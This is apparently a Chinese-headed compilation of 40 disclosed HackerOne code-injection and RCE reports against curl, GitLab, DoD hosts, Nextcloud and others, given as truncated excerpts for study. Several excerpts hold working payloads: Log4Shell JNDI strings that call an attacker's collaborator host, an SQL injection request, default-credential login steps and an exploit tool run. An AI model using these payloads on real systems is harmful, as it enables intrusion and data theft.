# HackerOne 实战案例：code-injection

_40 份已披露报告（High/Critical 优先），来源 HackerOne 公开披露_

## Internal application wrapper or script using curl
- 等级：Critical | 项目：curl | 披露：2026-04-03 | CVE：-
- 原文：https://hackerone.com/reports/3648199

- - - - - - - - 
While -guid is not a standard or documented curl command,  a Command Injection or Argument Injection vulnerability within a specific application that wraps curl.
Security Analysis: curl -guid -url  example.com
1. Status of the "-guid" FlagUndocumented/Non-existent: The official curl binary does not recognize a -guid flag. Standard versions will return an "unrecognized option" error.Custom Wrappers: This flag likely belongs to a custom internal script or a specialized wrapper (e.g., a "curl-guid" alias or a corporate security wrapper) that processes GUIDs for tracking requests.Injection Vector: If an application takes user input to fill this -guid field without sanitization, 


## Title: Remote Code Execution (RCE) via Arbitrary Library Loading in `--engine` option
- 等级：Critical | 项目：curl | 披露：2025-08-10 | CVE：-
- 原文：https://hackerone.com/reports/3293801

- - - - - - - - 
#### Summary:
The `curl` command-line tool is vulnerable to Arbitrary Code Execution on POSIX-like systems (Linux, macOS, etc.). The `--engine` option allows loading an OpenSSL crypto engine from a shared library (`.so` file). Crucially, this option accepts an **absolute or relative path** to the library file, allowing a user to load any shared library on the file system.
An attacker can craft a malicious shared library containing a `__attribute__((constructor))` function. This function is executed by the dynamic loader the moment the library is loaded into the `curl` process's memory, achieving immediate code execution, even before OpenSSL attempts to initialize it as an en


## CVE-2017-9822 DotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci
- 等级：Critical | 项目：MTN | 披露：2024-11-16 | CVE：CVE-2017-9822
- 原文：https://hackerone.com/reports/2762119

- - - - - - - - 
## Summary:
DotNetNuke (DNN) versions between 5.0.0 - 9.3.0 are affected to deserialization vulnerability that leads to Remote Code Execution (RCE). DotNetNuke uses the `DNNPersonalization` cookie to store anonymous users’ personalization options (the options for authenticated users are stored through their profile pages). This cookie is used when the application serves a custom 404 Error page, which is also the default settings. 
[code omitted]
The expected structure includes a `type` attribute to instruct the server which type of object to create on deserialization. The cookie is processed by the application whenever it attempts to load the current user's profile data, whi


## Remote code execution and exfiltration of secret tokens by poisoning the mozilla/fxa CI build cache
- 等级：Critical | 项目：Mozilla | 披露：2024-01-20 | CVE：-
- 原文：https://hackerone.com/reports/2255750

- - - - - - - - 
A security researcher was able to obtain an upload URL for NX Cloud's caching service, used by the Firefox Accounts repository. Because an authorized link could be used to upload more than once to the same artifact, the researcher was then able to poison the cache by re-uploading a modified cache artifact, and exfiltrate fxa's environment variables as a proof of concept. This vulnerability required an attacker to have access to the repository source code to be exploited, and in this case, the fxa repo is public.
---


## Remote code execution via crafted pentaho report uploaded using default credentials for pentaho business server
- 等级：Critical | 项目：MTN | 披露：2023-12-31 | CVE：-
- 原文：https://hackerone.com/reports/1677047

- - - - - - - - 
## Summary:
Good day,
                      While I do recon for mtn.ci domain I found  Pentaho business server at https://sm.mtn.ci:8888/pentaho with default credentials admin/password ,then I figured that I can upload  prpt reports to server which could use some beanshell,js and java to achieve RCE
## Steps To Reproduce:
1. Login to https://sm.mtn.ci:8888/pentaho admin/password  
{F1878259}
2. Use Pentaho report designer to create malicious report file  
{F1878260}
3. Upload and run the report   
{F1878261}  
{F1878262}
## Impact
The impact of an RCE vulnerability can range from malware execution to an attacker gaining full control over a compromised server.
---


## Remote Code Execution on ownCloud instances with ImageMagick installed
- 等级：Critical | 项目：ownCloud | 披露：2023-04-12 | CVE：-
- 原文：https://hackerone.com/reports/1838674

- - - - - - - - 
It is possible to execute code on ownCloud instances which have ImageMagick installed. This is due to the usage of ImageMagick for preview generation for some file types. (anything using [`OC\Preview\Bitmap`](https://github.com/owncloud/core/blob/83f600f8b89b62d52248dfdbc7046567be024b67/lib/private/Preview/Bitmap.php#L84-L92))
The prerequisite for exploitation seem to be:
- ImageMagick is installed (e.g. as [described in the ownCloud documentation](https://doc.owncloud.com/server/10.10/admin_manual/installation/manual_installation/manual_imagick7.html))
- The attacker knows the file path of a file that they uploaded (e.g. `/mnt/data/files/`)
- The attacker is able to upload 


## solr_log4j - http://██████████
- 等级：Critical | 项目：U.S. | 披露：2022-09-06 | CVE：-
- 原文：https://hackerone.com/reports/1631370

- - - - - - - - 
Hi security team, i found a solr log4j vulnerability in your aplication
## Impact
Logging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input
## System Host(s)
████████
## Affected Product(s) and Version(s)
## CVE Numbers
## Steps to Reproduce
Just send get request to this path and change your interact server
PATH ----> http://████████/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.YOURINTERACTSERVER/a%7D
## Suggested M


## ██████_log4j - https://██████
- 等级：Critical | 项目：U.S. | 披露：2022-09-06 | CVE：-
- 原文：https://hackerone.com/reports/1631364

- - - - - - - - 
Hi security team, i found a log4j vulnerability in your aplication
## Impact
Logging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input.
## System Host(s)
███████
## Affected Product(s) and Version(s)
## CVE Numbers
## Steps to Reproduce
Send POST request to this endpoint --->  https://██████/mifs/j_spring_security_check
the post request: 
j_username=${jndi:ldap://${hostName}.youinteractsserver}&j_password=password&logincontext=emplo


## ██████████ vulnerable to CVE-2022-22954
- 等级：Critical | 项目：U.S. | 披露：2022-04-29 | CVE：CVE-2022-22954
- 原文：https://hackerone.com/reports/1537543

- - - - - - - - 
I found that one of the targets belongs to **DOD** vulnerable to **CVE-2022-22954** where an attacker may be able to execute any malicious code like escalating Remote code execution is also possible 
**Technical Summary:**
CVE-2022-22954 is a server-side template injection vulnerability in the VMware Workspace ONE Access and Identity Manager. This vulnerability was assigned a CVSSv3 score of 9.8. An unauthenticated attacker with network access could exploit this vulnerability by sending a specially crafted request to a vulnerable VMware Workspace ONE or Identity Manager. Successful exploitation could result in remote code execution by exploiting a server-side template inject


## ███ vulnerable to CVE-2022-22954
- 等级：Critical | 项目：U.S. | 披露：2022-04-20 | CVE：CVE-2022-22954
- 原文：https://hackerone.com/reports/1537694

- - - - - - - - 
I found that one of the targets belongs to DOD vulnerable to CVE-2022-22954 where an attacker may be able to execute any malicious code like escalating Remote code execution is also possible 
**Technical Summary:**
CVE-2022-22954 is a server-side template injection vulnerability in the VMware Workspace ONE Access and Identity Manager. This vulnerability was assigned a CVSSv3 score of 9.8. An unauthenticated attacker with network access could exploit this vulnerability by sending a specially crafted request to a vulnerable VMware Workspace ONE or Identity Manager. Successful exploitation could result in remote code execution by exploiting a server-side template injection flaw


## F5 BIG-IP TMUI RCE - CVE-2020-5902 (██.packet8.net)
- 等级：Critical | 项目：8x8 | 披露：2022-03-25 | CVE：CVE-2020-5902
- 原文：https://hackerone.com/reports/1519841

- - - - - - - - 
@remonsec reported to us a vulnerability in F5 BIG-IP's Traffic Management User Interface (TMUI), which exploited, could have led to RCE (in undisclosed pages): [CVE-2020-5902](https://support.f5.com/csp/article/K52145254)
We swiftly applied the fix to the F5 BIG-IP & restricted access further, which resolved the issue.
---


## Remote Code Execution on ██.8x8.com via .NET VSTATE Deserialization
- 等级：Critical | 项目：8x8 | 披露：2022-02-03 | CVE：-
- 原文：https://hackerone.com/reports/1391576

- - - - - - - - 
@0daystolive reported to us a flaw in a 3rd party community platform, which could be exploited to achieve RCE. We swiftly relayed this to the vendor and their engineering team turned off the affected code, which resolved the issue.
**Summary (researcher):**
For more details about this vulnerability read: https://blog.sorcery.ie/posts/higherlogic_rce
TLDR:
1. Generate payload with [ysoserial.net](https://github.com/pwntester/ysoserial.net): [code omitted]
2. Insert payload into `__VSTATE` parameter on the page.
3. Submit the form.
4. A DNS request is observed on interactsh, confirming the RCE.
---


## Log4Shell: RCE 0-day exploit on █████████
- 等级：Critical | 项目：U.S. | 披露：2022-01-03 | CVE：CVE-2021-44228
- 原文：https://hackerone.com/reports/1429014

- - - - - - - - 
Hi team,
log4 shell is recent 0-day exploit it's Java package vulnerable. ██████████ domain is vulnerable
## Impact
RCE
## System Host(s)
█████████
## Affected Product(s) and Version(s)
## CVE Numbers
CVE-2021-44228
## Steps to Reproduce
1. Go to this url => https://███████/██████=%24%7bjndi%3aldap%3a%2f%2fx%24%7bhostName%7d.LOG45200SSRF.xxxxxx.burpcollaborator.net%2fa%7d
2. paste the poc code on  ██████ url parameter
3. like this =>   https://██████████/██████
4. then burp collaborator received reverse ping back
5. I attached poc videos and photos below
##POC CODE
${jndi:ldap://x${hostName}.log4j.xxxxxxx.burpcollaborator.net/a}
## Suggested Mitigation/Remediation Actions
ht


## RCE on 17 different Docker containers on your network
- 等级：Critical | 项目：Nextcloud | 披露：2021-10-20 | CVE：-
- 原文：https://hackerone.com/reports/1332433

- - - - - - - - 
## Summary:
I was able to get RCE on 17 different docker containers, ranging from postgres and some prod enviroments
## Steps To Reproduce:
I found that there was a unconfigured portainer.io service running on http://spreed-demo.nextcloud.com:9000
  1. I created an administrator account with the login creds admin:password (please change these credentials!!!)
  2. The site redirected me to the portainer backend, which displayed the docker containers running on the box, see first screen shot
  3. I was able to fully interact with the docker containers running, the site also allows me to execute arbitrary bash commands on the boxes, See second screenshot
Other info that was dis


## Custom crafted message object in Meteor.Call allows remote code execution and impersonation
- 等级：Critical | 项目：Rocket.Chat | 披露：2021-10-11 | CVE：-
- 原文：https://hackerone.com/reports/534887

- - - - - - - - 
The researcher found a vulnerability where an attacker could impersonate other users.
---


## Arbitrary Code Execution via npm misconfiguration – installing internal libraries from the public registry
- 等级：Critical | 项目：LY | 披露：2021-07-05 | CVE：-
- 原文：https://hackerone.com/reports/1043385

- - - - - - - - 
Due to misconfiguration of the Private NPM registry, a nodejs-based project was able to install a malicious module generated by an attacker instead of a normal module.
If an attacker registers a higher version with the same name as a private module with Global Registry, it will download and install malicious modules from the Global Registry rather than normal packages stored in private registry when building nodejs-based projects.
If the malicious package is installed, the malicious script in the package is executed on the machine where it was downloaded on.
As such, arbitrary code execution could have occurred on the affected hosts.
---


## RCE when removing metadata with ExifTool
- 等级：Critical | 项目：GitLab | 披露：2021-05-14 | CVE：-
- 原文：https://hackerone.com/reports/1154542

- - - - - - - -


## RCE via unsafe inline Kramdown options when rendering certain Wiki pages
- 等级：Critical | 项目：GitLab | 披露：2021-04-20 | CVE：-
- 原文：https://hackerone.com/reports/1125425

- - - - - - - -


## RCE on TikTok Ads Portal
- 等级：Critical | 项目：TikTok | 披露：2021-04-15 | CVE：-
- 原文：https://hackerone.com/reports/1024575

- - - - - - - - 
The video upload endpoint on the TikTok Ads portal was potentially susceptible to remote code execution (RCE) due to a ffmpeg misconfiguration. We thank @ bubbounty for reporting this to our team and confirming the resolution.
**Summary (researcher):**
During my research on the TikTok Ads portal I found a RCE thought the video creation process resulting to a root access on the system mainly due to a misconfugration ffmpeg. A simple id and ls commands results were reported and the TikTok team fixed the weakness quickly.
---


## RCE due to ImageTragick v2
- 等级：Critical | 项目：pixiv | 披露：2021-03-16 | CVE：-
- 原文：https://hackerone.com/reports/402362

- - - - - - - - 
Hello Pixiv team! Your Image processing process suffering from ImageTragick v2. Issue is caused by ghostscript RCE findnings.
How to reproduce:
PATCH /design
Host: manage.booth.pm
send following image:
[code omitted]
How to fix:
Update ImageMagick, should help
## Impact
Remote Code Execution
---


## RCE via npm misconfig -- installing internal libraries from the public registry
- 等级：Critical | 项目：Uber | 披露：2021-02-24 | CVE：-
- 原文：https://hackerone.com/reports/1007014

- - - - - - - - 
The hacker spotted some orphaned references to Uber-branded Node.js library packages and claimed them on the public NPM registry to run their own proof-of-concept code.
**Summary (researcher):**
[Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610?sk=991ef9a180558d25c5c6bc5081c99089)
---


## SQL Injection in www.hyperpure.com
- 等级：Critical | 项目：Eternal | 披露：2021-02-22 | CVE：-
- 原文：https://hackerone.com/reports/1044716

- - - - - - - - 
Vulnerable Request :
PUT /consumer/onboarding/saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc    HTTP/1.1
Host: api.hyperpure.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
X-Client: consumer
X-TrackingId: 8242c5a2-6325-4101-96b8-c7ed6008e92a
HeaderRoute: v2
APIVersion: 4.2
AppType: web
Content-Length: 246
Origin: https://www.hyperpure.com
Connection: close
Referer: https://www.hyperpure.com/register
{"address":{"addressLine":"test","cityId":34,"state":{"name":"Gujarat"},"zipCode":


## RCE via npm misconfig -- installing internal libraries from the public registry
- 等级：Critical | 项目：PayPal | 披露：2021-02-09 | CVE：-
- 原文：https://hackerone.com/reports/925585

- - - - - - - - 
A Bug Bounty researcher identified an issue where certain development projects defaulted to the public NPM registry, instead of using the intended internal packages. Since the packages on the public registry did not exist, the researcher created these and observed they were downloaded. Had these packages been registered with malicious intent, it is possible for internal development to have included this code. While there are additional checks and controls in the development pipeline, this could have caused significant issues for internal systems. Thanks to the researcher's report, PayPal was able to mitigate the issue with the public registry and confirmed no evidence of pri


## Apache solr RCE via velocity template
- 等级：Critical | 项目：U.S. | 披露：2021-01-12 | CVE：-
- 原文：https://hackerone.com/reports/822002

- - - - - - - - 
Hi team, 
While doing some recon i stumbled upon an IP address http://██████/ The IP took me to a Login Page at ████=https%3A%2F%2F██████████████████
as of the URL suggest this system belongs to US gov. 
Doing a Port scan reveals that POST ██████████ is Open, A lot of doors open if Solr is exposed outside of a trusted network and without administrative authentication.  and the solar instance was without any authentication http://████:████████/ 
Running a Query http://████████:█████████*:*  Showed data from http://██████.mil/ that's why i decided to report it here 
#Query output example: 
[code omitted]`
And the Solar Instance is Vulnuberal to RCE via via velocity template 
#


## Websites Can Run Arbitrary Code on Machines Running the 'PlayStation Now' Application
- 等级：Critical | 项目：PlayStation | 披露：2020-12-04 | CVE：-
- 原文：https://hackerone.com/reports/873614

- - - - - - - - 
-
**Summary (researcher):**
# Summary
The PlayStation Now application version `11.0.2` is vulnerable to remote code execution (RCE). Any website loaded in any browser on the same machine can run arbitrary code on the machine through a vulnerable websocket connection.
1. The local websocket server at `localhost:1235` does not check the origin of incoming requests.
    1. This allows websites loaded in browsers on the same machine to send requests to the websocket server.
    2. Websockets are not bound by the Same-Origin Policy so the websocket server has to do this manually.
2. psnow launches an Electron application named `AGL`.
    1. It's possible to tell AGL to load a spe


## Remote Code Execution on █████████
- 等级：Critical | 项目：U.S. | 披露：2020-09-03 | CVE：CVE-2019-0192,
- 原文：https://hackerone.com/reports/962013

- - - - - - - - 
**Summary:**
An unauth solr lead to RCE on ██████████
**Description:**
Hello, I found a solr unauth at https://██████/solr/
This version is 5.5.1, vulnerable with CVE-2019-0192 and CVE-2019-0193, i have try CVE-2019-0193 and successful RCE.
## Impact
Attacker can get shell on server.
## Step-by-step Reproduction Instructions
1. First go to Core Admin and copy path.
██████
2. Update the config.
███████
3. Execute code.
██████████
## Product, Version, and Configuration (If applicable)
Apache Sole 5.5.1
## Suggested Mitigation/Remediation Actions
Update to the latest version and set auth.
## Impact
Attacker can get shell on server.
---


## Remote Code Execution in Slack desktop apps + bonus
- 等级：Critical | 项目：Slack | 披露：2020-08-28 | CVE：-
- 原文：https://hackerone.com/reports/783877

- - - - - - - - 
# Summary
With any in-app redirect - logic/open redirect, HTML or javascript injection it's possible to execute arbitrary code within Slack desktop apps. This report demonstrates a specifically crafted exploit consisting of an HTML injection, security control bypass and a RCE Javascript payload. This exploit was tested as working on the latest Slack for desktop (4.2, 4.3.2) versions (Mac/Windows/Linux). 
To demonstrate the impact of this RCE vulnerability and how it could be used in various scenarios, a new approach was developed for the starting point (HTML injection & payload) as vulnerabilities reported previously cannot be used anymore [#738229](https://hackerone.com/rep


## Java Debug Console Provides Command Injection Without Privellage Esclation
- 等级：Critical | 项目：MTN | 披露：2020-07-23 | CVE：-
- 原文：https://hackerone.com/reports/767482

- - - - - - - - 
## Summary:
   I intially found the debug console as a tool to insert arbitrary html/xss bugs, however after further probing the debug console it has some serious security flaws to allow arbitrary java code to be executed. My intial report of a seperate bug using this console, https://hackerone.com/reports/767077, uses the out.print functionality to write html code into the jsp page to perform a XSS attack. This intself is a dangerous bug for compromising users of the webapp. However, what is even more dangerous is allowing any abritratry java code to be executed on the server that an attacker controls. This is exactly what the debug console allows. The console spawns calls 


## Docker image with FPM is vulnerable to CVE-2019-11043
- 等级：Critical | 项目：Nextcloud | 披露：2020-03-14 | CVE：CVE-2019-11043
- 原文：https://hackerone.com/reports/720306

- - - - - - - - 
The CVE-2019-11043 vulnerability can be exploited in the latest nextcloud:fpm image.
This is due to the specific nginx configuration recommended for nextcloud:
https://github.com/nextcloud/docker#base-version---fpm
https://github.com/nextcloud/documentation/blob/master/admin_manual/installation/nginx.rst
https://github.com/nextcloud/docker/blob/master/.examples/docker-compose/with-nginx-proxy/mariadb/fpm/web/nginx.conf
Here's the exploit: https://github.com/neex/phuip-fpizdam
Sample exploit run:
# ./phuip-fpizdam http://localhost:8080/ocs/v2.php
2019/10/22 19:36:29 Base status code is 200
2019/10/22 19:36:30 Status code 502 for qsl=1765, adding as a candidate
2019/10/22 19:3


## (Authenticated) RCE by bypassing of the .htaccess blacklist
- 等级：Critical | 项目：Nextcloud | 披露：2020-03-01 | CVE：-
- 原文：https://hackerone.com/reports/228825

- - - - - - - - 
`Storage::copyFromStorage` doesn't check the content of a folder it copies against the list of blacklisted files.
Meaning that if a user has access to an external storage (inc. fed. shares) that contains a .htaccess file, he can move the .htaccess file to the local data directory.
The attack works on any nextcloud/owncloud since federated sharing was introduced that uses apache and has the data directory inside the webroot (as is default)
Steps to reproduce:
- Setup an evil instance (nc1) that has the file blacklist disabled (Filesystem.php line 616)
- create a folder 'sharefolder/attack' in nc1 with the following files
  - .htaccess configured to "allow from all"
  - attack


## Several simple remote code execution in pdf-image
- 等级：Critical | 项目：Node.js | 披露：2020-02-24 | CVE：CVE-2020-8132
- 原文：https://hackerone.com/reports/781664

- - - - - - - - 
I would like to report "A simple remote code execution" in "pdf-image".
It allows "a remote attacker to execute arbitrary code when several functions of the PDFImage class are called and the class loaded from user-input value".
# Module
**module name:** pdf-image
**version:** latest
**npm page:** `https://www.npmjs.com/package/pdf-image`
## Module Description
Provides an interface to convert PDF's pages to png files in Node.js by using ImageMagick.
## Module Stats
[1] weekly downloads: 8,691
# Vulnerability
## Vulnerability Description
Hello there ! I understand this bug isn't eligible for a bounty. I am reporting it either way. I've found several code execution in the pdf-i


## Public instance of Jenkins on https://██████████/ with /script enabled
- 等级：Critical | 项目：U.S. | 披露：2020-01-31 | CVE：-
- 原文：https://hackerone.com/reports/768266

- - - - - - - - 
**Summary:**
An Amazon instance was found on https://█████/ running Jenkins. On analysing the SSL certificate, I reported here to the DoD.
**Description:**
On checking the SSL certificate, the details show:
[code omitted]
Here, this instance is already authenticated and this does not require a password to login. The major impact of this vulnerability is, an attacker can exploit and gain access to critical internals of the server as `/script` is enabled.
Through `/script`, an attacker can run remote commands on the server through the Java programming language.
## Impact
Unauthenticated instances of Jenkins with `/script` enabled can lead to an attacker running remote command 


## Arbitrary file read via ffmpeg HLS parser at https://www.flickr.com/photos/upload
- 等级：Critical | 项目：Flickr | 披露：2020-01-25 | CVE：-
- 原文：https://hackerone.com/reports/487008

- - - - - - - - 
Summary: FFmpeg is a video and audio software that is used for generating previews and for converting videos. Your current installation allows HLS playlists that contain references to external files, which leads to local file disclosure.
Steps to Reproduce:
1.Download the attached file. {F413554}
2.Go to https://www.flickr.com/photos/upload/ and upload the attached file.
3.Now go to https://www.flickr.com/cameraroll and you should be able to see contents of /etc/passwd. {F413555}
For clear view open the video from **Photostream** section.
Please let me know if you need any help :)
## Impact
An attacker can read files of etc/passwd or other contents.Also what I've seen it is 


## Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message
- 等级：Critical | 项目：Valve | 披露：2019-10-08 | CVE：-
- 原文：https://hackerone.com/reports/631956

- - - - - - - - 
## Overview
Counter-Strike: Global Offensive's UI is built of a framework called [Panorama](https://developer.valvesoftware.com/wiki/Dota_2_Workshop_Tools/Panorama) which is heavily influenced by modern HTML/CSS with JS capabilities. Because of these properties, the UI becomes easily vulnerable to different types of code injection, most notably XSS.
Previously, it was discovered that a certain message-type sent through the lobby chat allowed anyone to send raw HTML strings that would then be parsed by the Panorama framework as valid HTML. The reason this XSS was possible was because of a certain Panorama tag that was left enabled.
In order to see how these Panorama files are


## Remote Code Execution (RCE) in a DoD website
- 等级：Critical | 项目：U.S. | 披露：2019-10-04 | CVE：-
- 原文：https://hackerone.com/reports/248116

- - - - - - - - 
**Summary:**
One of the DoD applications uses a java library which is vulnerable to expression language injection. Using only an URL I was able to inject java code. I made a simple PoC that requests a name resolution to a DNS server.
**Description:**
The application at https://███ uses Primefaces version 5.3 which is vulnarable to Expression Language injection through DynamicContent generator.
To prove the injection I made a PoC that tries to submit a HTTP request, but the server blocks the outgoing packets on port 80, on the other hand the server still try to resolve the requested domain and so I receive DNS requests from DoD server. Also, I can delete and maybe read files 


## Root Remote Code Execution on https://███
- 等级：Critical | 项目：U.S. | 披露：2019-10-04 | CVE：CVE-2019-11580
- 原文：https://hackerone.com/reports/632721

- - - - - - - - 
**Summary:**
Atlassian Crowd is a centralized identity management application that allows companies to "Manage users from multiple directories - Active Directory, LDAP, OpenLDAP or Microsoft Azure AD - and control application authentication permissions in one single location."
A DOD installation is vulnerable to a remote code execution vulnerability due to not patching CVE-2019-11580.
**Description:**
From Atlassian's public [advisory](https://confluence.atlassian.com/crowd/crowd-security-advisory-2019-05-22-970260700.html):
> Crowd and Crowd Data Center had the pdkinstall development plugin incorrectly enabled in release builds. Attackers who can send unauthenticated or aut


## accounts.informatica.com - RCE due to exposed Groovy console
- 等级：Critical | 项目：Informatica | 披露：2019-08-14 | CVE：-
- 原文：https://hackerone.com/reports/672243

- - - - - - - - 
Researcher identified a misconfigured "Groovy" panel on an AEM web application that was vulnerable to RCE. The panel was subsequently disabled.
---


## RCE on █████ via CVE-2017-10271
- 等级：Critical | 项目：U.S. | 披露：2019-07-01 | CVE：CVE-2017-10271
- 原文：https://hackerone.com/reports/576887

- - - - - - - - 
**Summary:**
Happy Friday! The server at `██████` is vulnerable to CVE-2017-10271 "Oracle WebLogic Server Remote Command Execution".
**Description:**
The following request takes 12 seconds (12000 milliseconds) to complete:
[code omitted]
This proves that I have Java code execution on the remote server. 
ref: https://techblog.mediaservice.net/2018/07/cve-2017-10271-oracle-weblogic-server-remote-command-execution-sleep-detection-payload/
Public exploits for this exist: https://github.com/c0mmand3rOpSec/CVE-2017-10271
I was not able to use that script with a `ping` command, which might have been blocked by preventing outbound connections.
## Suggested Mitigation/Remediation Act


## RCE and Complete Server Takeover of http://www.█████.starbucks.com.sg/
- 等级：Critical | 项目：Starbucks | 披露：2019-04-10 | CVE：-
- 原文：https://hackerone.com/reports/502758

- - - - - - - - 
This report from @spaceraccoon demonstrated a valid attack resulting in RCE and full compromise of the target. The detailed and thorough report was especially helpful throughout the triage process, and ultimately helped us reproduce and resolve the issue as quickly as possible. The vulnerable site has been taken offline.
We'd like to thank @spaceraccoon for the submission, and hope to continue to see reports like this in the future.
**Summary (researcher):**
## Chaining CVEs: From a 404 Page to RCE


## Remote code executio in  NPM package getcookies
- 等级：Critical | 项目：Node.js | 披露：2019-04-03 | CVE：-
- 原文：https://hackerone.com/reports/346516

- - - - - - - - 
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!
I would like to report remote code execution in the `getcookies` module.
It allows to remotely inject and execute code in the target server.
# Module
**module name:** getcookies
**version:** 1.12.3
**npm page:** `https://www.npmjs.com/package/getcookies`
Also affects all the modules that use `getcookies`, notable ones:
* `express-cookies@1.4.7` - https://www.npmjs.com/package/express-cookies
## Module Description
Ba

